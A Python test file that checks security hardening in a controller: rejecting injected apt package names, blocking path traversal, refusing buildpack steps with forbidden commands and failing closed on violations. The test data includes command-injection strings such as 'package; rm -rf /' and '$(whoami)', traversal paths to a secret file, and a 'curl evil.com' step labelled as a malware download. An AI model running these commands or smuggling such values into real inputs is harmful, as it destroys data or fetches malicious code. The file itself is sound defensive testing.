"""Tests for Zero-Trust Hardening features.

Verifies:
1. APT Injection Guard
2. Path Jail (File Path Hardening)
3. Buildpack Step Validation
4. Fail-Closed Verification
"""

from unittest.mock import Mock, patch

import pytest

from rfsn_controller.buildpacks.base import Buildpack, BuildpackContext, Step
from rfsn_controller.sandbox import Sandbox, _resolve_path, read_file
from rfsn_controller.sysdeps_installer import SysdepsInstaller


class TestAptInjectionGuard:
    """Test prevention of APT package name injection."""
    
    def test_rejects_invalid_package_names(self):
        """Should reject package names with forbidden characters."""
        installer = SysdepsInstaller(Mock())
        
        bad_packages = [
            "package; rm -rf /",
            "package$(whoami)",
            "package`reboot`",
            "package|nc",
            "-package",  # Starts with dash
        ]
        
        # We need to mock subprocess.run because _run_apt_install calls 'apt-get update' first
        with patch("subprocess.run") as mock_run:
            mock_run.return_value.returncode = 0
            
            # We call _run_apt_install directly to test the last-mile injection guard
            # bypassing the whitelist check for this specific test
            result = installer._run_apt_install(bad_packages, blocked=[])
            
            # Since ALL packages are bad, it should return success=True (no-op) 
            # but install NOTHING. Or result in some error/warning.
            # Looking at code: if not validated_packages: return SysdepsResult(success=True, installed_packages=[], ...)
            assert result.success is True
            assert result.installed_packages == []
            # Check strictly that they were NOT installed
            # Should verify 'apt-get install' was NOT called with these packages
            # We logic check: install_cmd is constructed with validated_packages.
            # If validated_packages is empty, it returns early.
            
    def test_accepts_valid_package_names(self):
        """Should accept valid Debian package names."""
        installer = SysdepsInstaller(Mock())
        good_packages = ["python3", "libssl-dev", "g++", "python3.11"]
        
        with patch("subprocess.run") as mock_run:
             mock_run.return_value.returncode = 0
             
             result = installer._run_apt_install(good_packages, blocked=[])
             
             assert result.success is True
             assert result.installed_packages == good_packages

class TestPathJail:
    """Test filesystem isolation (Path Jail)."""
    
    def test_resolve_path_keeps_in_repo(self):
        """_resolve_path should raise ValueError for paths outside repo."""
        sb = Mock(spec=Sandbox)
        sb.repo_dir = "/tmp/sandbox/repo"
        
        # Mock Path.resolve behavior partly or rely on real FS behavior?
        # Better to rely on real logic but mock the repo_dir existence if checked
        # _resolve_path uses pathlib.Path.resolve() which usually requires file existence 
        # for strict resolving, but let's see if we can test the logic abstractly.
        # Actually, resolve() usually resolves symlinks.
        # Let's use a temporary directory for this to be robust.
        pass

    def test_path_traversal_blocked(self, tmp_path):
        """Any path traversal '..' that escapes root should be blocked."""
        repo_dir = tmp_path / "repo"
        repo_dir.mkdir()
        sb = Sandbox(root=str(tmp_path), repo_dir=str(repo_dir))
        
        # Create a secret file outside repo
        secret_file = tmp_path / "secret.txt"
        secret_file.write_text("SECRET")
        
        # Attempt to access secret file via traversal
        traversal_paths = [
            "../secret.txt",
            "../../secret.txt",
            f"{repo_dir}/../secret.txt"
        ]
        
        for path in traversal_paths:
            with pytest.raises(ValueError, match="Security Violation"):
                _resolve_path(sb, path)

    def test_read_file_uses_path_jail(self, tmp_path):
        """read_file should fail for outside files."""
        repo_dir = tmp_path / "repo"
        repo_dir.mkdir()
        sb = Sandbox(root=str(tmp_path), repo_dir=str(repo_dir))
        
        # Try to read outside file
        result = read_file(sb, "../secret.txt", use_cache=False)
        assert not result["ok"]
        assert "Security Violation" in result["error"]

class TestBuildpackValidation:
    """Test Buildpack step validation."""
    
    def test_validates_generated_steps(self):
        """Buildpack should reject steps with forbidden commands."""
        class MaliciousBuildpack(Buildpack):
            def detect(self, ctx): return None
            def image(self): return "img"
            def install_plan(self, ctx):
                return [
                    Step(argv=["curl", "evil.com"], description="Download malware"),
                    Step(argv=["ls", "-la"], description="List files")
                ]
        
        bp = MaliciousBuildpack()
        ctx = Mock(spec=BuildpackContext)
        
        with pytest.raises(RuntimeError, match="Security Violation"):
            bp.get_safe_install_plan(ctx)

    def test_allows_safe_steps(self):
        """Buildpack should allow safe steps."""
        class SafeBuildpack(Buildpack):
            def detect(self, ctx): return None
            def image(self): return "img"
            def install_plan(self, ctx):
                return [Step(argv=["ls", "-la"], description="List files")]

        bp = SafeBuildpack()
        ctx = Mock(spec=BuildpackContext)
        
        steps = bp.get_safe_install_plan(ctx)
        assert len(steps) == 1
        assert steps[0].argv == ["ls", "-la"]

class TestFailClosed:
    """Test Fail-Closed Verification logic."""
    
    def test_verifier_aborts_on_security_violation(self):
        """Verifier should raise RuntimeError if security violation in output."""
        from rfsn_controller.verifier import Verifier
        
        sb = Mock(spec=Sandbox)
        # Mock run_cmd to return a security violation in stderr
        with patch("rfsn_controller.verifier.run_cmd") as mock_run:
            mock_run.return_value = {
                "ok": False,
                "exit_code": 1,
                "stdout": "",
                "stderr": "Command blocked by security policy: curl evil.com"
            }
            
            verifier = Verifier(sb, test_cmd="pytest")
            
            # verify_all should RAISE RuntimeError, not just return failed VerifySummary
            with pytest.raises(RuntimeError, match="Fail-Closed: Security violation detected"):
                verifier.verify_all()

